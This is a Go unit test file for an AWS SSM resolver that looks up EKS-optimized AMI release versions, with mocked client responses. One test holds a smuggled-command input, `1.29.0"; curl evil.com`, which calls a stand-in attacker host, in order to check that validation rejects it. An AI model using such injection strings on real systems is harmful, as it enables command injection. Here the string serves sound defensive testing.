package ami_test

import (
	"context"
	"errors"
	"testing"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ssm"
	ssmtypes "github.com/aws/aws-sdk-go-v2/service/ssm/types"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	amiresolver "github.com/kaiohenricunha/ami-update-automation/internal/ami"
	"github.com/kaiohenricunha/ami-update-automation/pkg/types"
)

type mockSSMClient struct {
	params map[string]string
	err    error
}

func (m *mockSSMClient) GetParameter(_ context.Context, in *ssm.GetParameterInput, _ ...func(*ssm.Options)) (*ssm.GetParameterOutput, error) {
	if m.err != nil {
		return nil, m.err
	}
	v, ok := m.params[*in.Name]
	if !ok {
		return nil, &ssmtypes.ParameterNotFound{}
	}
	return &ssm.GetParameterOutput{
		Parameter: &ssmtypes.Parameter{
			Name:  in.Name,
			Value: aws.String(v),
		},
	}, nil
}

func TestSSMResolverFound(t *testing.T) {
	client := &mockSSMClient{
		params: map[string]string{
			"/aws/service/eks/optimized-ami/1.29/amazon-linux-2/recommended/release_version": "1.29.3-20240531",
		},
	}
	resolver := amiresolver.NewSSMResolver(client)
	v, err := resolver.Resolve(context.Background(), "1.29", "amazon-linux-2")
	require.NoError(t, err)
	assert.Equal(t, "1.29.3-20240531", v.Version)
	assert.Equal(t, "1.29", v.K8sVersion)
}

func TestSSMResolverNotFound(t *testing.T) {
	client := &mockSSMClient{params: map[string]string{}}
	resolver := amiresolver.NewSSMResolver(client)
	_, err := resolver.Resolve(context.Background(), "1.29", "amazon-linux-2")
	require.Error(t, err)
	assert.ErrorIs(t, err, types.ErrSSMParameterNotFound)
}

func TestSSMResolverAPIError(t *testing.T) {
	client := &mockSSMClient{err: errors.New("network error")}
	resolver := amiresolver.NewSSMResolver(client)
	_, err := resolver.Resolve(context.Background(), "1.29", "amazon-linux-2")
	require.Error(t, err)
	assert.ErrorIs(t, err, types.ErrSSMParameterNotFound)
}

func TestSSMResolverInvalidK8sVersion(t *testing.T) {
	client := &mockSSMClient{}
	resolver := amiresolver.NewSSMResolver(client)
	_, err := resolver.Resolve(context.Background(), "bad-version", "amazon-linux-2")
	require.Error(t, err)
	assert.ErrorIs(t, err, types.ErrInputValidation)
}

func TestSSMResolverInvalidAMIValue(t *testing.T) {
	client := &mockSSMClient{
		params: map[string]string{
			"/aws/service/eks/optimized-ami/1.29/amazon-linux-2/recommended/release_version": `1.29.0"; curl evil.com`,
		},
	}
	resolver := amiresolver.NewSSMResolver(client)
	_, err := resolver.Resolve(context.Background(), "1.29", "amazon-linux-2")
	require.Error(t, err)
}

func TestSSMResolverContextCancel(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	client := &mockSSMClient{err: context.Canceled}
	resolver := amiresolver.NewSSMResolver(client)
	_, err := resolver.Resolve(ctx, "1.29", "amazon-linux-2")
	require.Error(t, err)
}
